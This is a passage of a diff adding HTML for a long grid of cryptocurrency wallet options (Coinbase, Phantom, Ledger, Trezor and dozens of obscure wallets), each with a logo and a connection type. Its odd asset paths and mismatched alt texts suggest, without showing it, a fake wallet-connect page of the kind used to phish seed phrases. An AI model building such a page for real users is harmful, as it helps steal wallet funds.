+                  <img src="success/way/img/coinbase.png" alt="Coinbase Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Coinbase</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Phantom Wallet"
+                data-logo="success/way/img/phantom.png" data-type="walletconnect"
+                style="width: 90px; height: 90px; padding-left: 20px;">
+                <img src="success/way/img/phantom.png" alt="Phantom Wallet" class="wallet-icon">
+                <div class="wallet-info-content">
+                  <div class="wallet-name" style="
+            margin-top: 5px  !important
+            ">Phantom</div>
+                  <div class="wallet-description">Smart investing wallet</div>
+                </div>
+              </div>
+              <div class="wallet-option" data-title="Ledger Live" data-logo="success/way/img/ledger.png"
+                data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                <img src="success/way/img/ledger.png" alt="Ledger Live" class="wallet-icon">
+                <div class="wallet-info-content">
+                  <div class="wallet-name" style="
+            margin-top: 5px  !important
+            ">Ledger</div>
+                  <div class="wallet-description">Multi-blockchain wallet</div>
+                </div>
+              </div>
+              <div class="wallet-option" data-title="SafePal" data-logo="success/way/img/safepal.png"
+                data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                <img src="success/way/img/safepal.png" alt="SafePal" class="wallet-icon">
+                <div class="wallet-info-content">
+                  <div class="wallet-name" style="
+            margin-top: 5px  !important
+            ">SafePal</div>
+                  <div class="wallet-description">Hardware &amp; software wallet</div>
+                </div>
+              </div>
+              <div class="wallet-option" data-title="OKX Wallet" data-logo="success/way/img/okx.png"
+                data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                <img src="success/way/img/okx.png" alt="OKX Wallet" class="wallet-icon">
+                <div class="wallet-info-content">
+                  <div class="wallet-name" style="
+            margin-top: 5px  !important
+            ">OKX </div>
+                  <div class="wallet-description">Multi-currency wallet</div>
+                </div>
+              </div>
+              <div class="wallet-option" data-title="Brave Wallet" data-logo="assetsa/brave.webp"
+                data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                <img src="assetsa/brave.webp" alt="Brave Wallet" class="wallet-icon">
+                <div class="wallet-info-content">
+                  <div class="wallet-name" style="
+            margin-top: 5px  !important
+            ">Brave...</div>
+                  <div class="wallet-description">Multi-currency wallet</div>
+                </div>
+              </div>
+                <div class="wallet-option" data-title="Defly" data-logo="assetsa/defly.svg"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/defly.svg" alt="Coinbase Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Defly</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title=" Lute" data-logo="assetsa/lute.svg"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/lute.svg" alt="Coinbase Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Lute</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Pera" data-logo="assetsa/pera.svg"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/pera.svg" alt="Coinbase Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Pera</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+              
+                <div class="wallet-option" data-title="Rainbow Wallet"
+                  data-logo="success/way/img/rainbow.png" data-type="injected"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/rainbow.png" alt="Rainbow Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Rainbow</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                
+                <div class="wallet-option" data-title="Coinomi" data-logo="assetsa/coinomni.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/coinomni.webp" alt="Coinomi" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Coinomi</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Exodus Wallet" data-logo="assetsa/exodus.webp"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/exodus.webp" alt="Coinomi" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Exodus</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="TronLink" data-logo="success/way/img/tronlink.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/tronlink.png" alt="TronLink" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">TronLink</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Solflare" data-logo="success/way/img/solflare.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/solflare.png" alt="Solflare" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Solflare</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Keplr" data-logo="success/way/img/keplr.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/keplr.png" alt="Keplr" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Keplr</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Trezor" data-logo="success/way/img/trezor.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/trezor.png" alt="Trezor" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Trezor</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="BitKeep" data-logo="success/way/img/bitkeep.jpg"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/bitkeep.jpg" alt="BitKeep" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">BitKeep</div>
+                    <div class="wallet-description">Multi-chain wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="OneKey" data-logo="success/way/img/onekey.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/onekey.png" alt="OneKey" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">OneKey</div>
+                    <div class="wallet-description">Hardware &amp; software wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Coin98" data-logo="success/way/img/coin98.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/coin98.png" alt="Coin98" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Coin98</div>
+                    <div class="wallet-description">DeFi super app wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="imToken" data-logo="success/way/img/imtoken.png"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/imtoken.png" alt="imToken" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">imToken</div>
+                    <div class="wallet-description">Ethereum &amp; DeFi wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Ellipal" data-logo="success/way/img/ellipal.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/ellipal.png" alt="Ellipal" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Ellipal</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Argent" data-logo="success/way/img/argent.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/argent.png" alt="Argent" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Argent</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+  
+                <div class="wallet-option" data-title="Uniswap Wallet"
+                  data-logo="success/way/img/uniswap.png" data-type="walletconnect"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/uniswap.png" alt="Uniswap Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Uniswap</div>
+                    <div class="wallet-description">The official Uniswap wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Zelcore" data-logo="success/way/img/zelcore.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/zelcore.png" alt="Zelcore" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Zelcore</div>
+                    <div class="wallet-description">Multi-asset wallet &amp; platform</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Stablez" data-logo="assetsa/stablez.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/stablez.webp" alt="Stablez" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Stablez</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="StrikeX" data-logo="assetsa/strike.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/strike.webp" alt="StrikeX" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">StrikeX</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Subwallet" data-logo="assetsa/subwallet.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/subwallet.webp" alt="Subwallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Subwallet</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Superhero" data-logo="assetsa/superhero.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/superhero.webp" alt="Superhero" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Super...</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Talisman" data-logo="assetsa/talisman.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/talisman.webp" alt="Talisman" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Talisman</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Venly" data-logo="assetsa/venly.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/venly.webp" alt="Venly" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Venly</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Walletverse" data-logo="assetsa/walletverse.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/walletverse.webp" alt="Walletverse" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Wallet...</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Wallypto" data-logo="assetsa/wallypto.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/wallypto.webp" alt="Wallypto" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Wallypto</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="37x" data-logo="assetsa/37x.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/37x.webp" alt="Shido" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">37x</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="3mint" data-logo="assetsa/3mint.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/3mint.webp" alt="3mint" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">3mint</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="3S Wallet" data-logo="assetsa/3s.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/3s.webp" alt="Shido" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">3S Wallet</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Abra" data-logo="assetsa/abra.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/abra.webp" alt="Abra" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Abra</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Absolute" data-logo="assetsa/absolute.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/absolute.webp" alt="Absolute" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Absolute</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Airgap" data-logo="assetsa/airgap.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/airgap.webp" alt="Airgap" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Airgap</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Alicebob" data-logo="assetsa/alicebob.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/alicebob.webp" alt="Alicebob" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Alicebob</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Altme" data-logo="assetsa/altme.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/altme.webp" alt="Altme" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Altme</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Amaze" data-logo="assetsa/amaze.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/amaze.webp" alt="Amaze" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Amaze</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Ambire" data-logo="assetsa/ambire.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/ambire.webp" alt="Ambire" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Ambire</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Ammer" data-logo="assetsa/ammer.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/ammer.webp" alt="Ammer" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Ammer</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Arianee" data-logo="assetsa/arianee.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/arianee.webp" alt="Arianee" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Arianee</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Assure" data-logo="assetsa/assure.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/assure.webp" alt="Assure" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Assure</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Aton" data-logo="assetsa/aton.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/aton.webp" alt="Aton" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Aton</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Avacus" data-logo="assetsa/avacus.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/avacus.webp" alt="Avacus" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Avacus</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Ballet" data-logo="assetsa/ballet.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/ballet.webp" alt="Ballet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Ballet</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Bee" data-logo="assetsa/bee.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/bee.webp" alt="Bee" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Bee</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Beexo" data-logo="assetsa/beexo.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/beexo.webp" alt="Beexo" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Beexo</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Bharatbox" data-logo="assetsa/bharatbox.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/bharatbox.webp" alt="Bharatbox" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Bharat...</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Bim" data-logo="assetsa/bim.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/bim.webp" alt="Bim" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Bim</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="ABWallet" data-logo="assetsa/ab.webp"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="assetsa/ab.webp" alt="ABWallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">ABWallet</div>
+                    <div class="wallet-description">Hardware &amp; software wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Stargazer Wallet"
+                  data-logo="success/way/img/stargazer.png" data-type="injected"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/stargazer.png" alt="Stargazer Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Stargazer</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Backpack" data-logo="success/way/img/backpack.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/backpack.png" alt="Backpack" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Backpack</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Sui Wallet" data-logo="success/way/img/suiwallet.jpg"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/suiwallet.jpg" alt="Sui Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Sui Wal..</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Sparrow Wallet"
+                  data-logo="success/way/img/sparrow.png" data-type="injected"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/sparrow.png" alt="Sparrow Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Sparrow</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="D'cent Wallet" data-logo="success/way/img/dcent.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/dcent.png" alt="D'cent Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">D'cent</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Tonkeeper" data-logo="success/way/img/tonkeeper.png"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/tonkeeper.png" alt="Tonkeeper" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Tonkeeper</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Lobstr" data-logo="success/way/img/lobstr.jpg"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/lobstr.jpg" alt="Lobstr" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Lobstr</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Kasware" data-logo="success/way/img/kasware.png"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/kasware.png" alt="Kasware" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Kasware</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Petra" data-logo="success/way/img/petra.svg"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/petra.svg" alt="Petra" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Petra</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Pontem" data-logo="success/way/img/pontem.svg"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/pontem.svg" alt="Pontem" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Pontem</div>
+                    <div class="wallet-description">Multi-currency wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Gaurda" data-logo="success/way/img/guarda_wallet.jpg"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/guarda_wallet.jpg" alt="Gaurda" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Gaurda</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="First Ledger"
+                  data-logo="success/way/img/firstledger.png" data-type="injected"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/firstledger.png" alt="First Ledger" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">First Le...</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Bifrost Wallet"
+                  data-logo="success/way/img/bifrost.png" data-type="walletconnect"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/bifrost.png" alt="Bifrost Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Bifrost</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Rabby Wallet" data-logo="success/way/img/rabby.jpg"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/rabby.jpg" alt="Rabby Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Rabby</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Blue Wallet" data-logo="success/way/img/blue.png"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/blue.png" alt="Blue Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Blue</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Livepeer" data-logo="success/way/img/livepeer.png"
+                  data-type="walletconnect" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/livepeer.png" alt="Livepeer" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Livepeer</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Solidifi" data-logo="success/way/img/solidifi.jpg"
+                  data-type="injected" style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/solidifi.jpg" alt="Solidifi" class="wallet-icon">
+                  <div class="wallet-info-content">
+                    <div class="wallet-name" style="
+              margin-top: 5px  !important
+              ">Solidifi</div>
+                    <div class="wallet-description">Smart investing wallet</div>
+                  </div>
+                </div>
+                <div class="wallet-option" data-title="Xaman Wallet"
+                  data-logo="success/way/img/xamanwallet.png" data-type="injected"
+                  style="width: 90px; height: 90px; padding-left: 20px;">
+                  <img src="success/way/img/xamanwallet.png" alt="Xaman Wallet" class="wallet-icon">
+                  <div class="wallet-info-content">
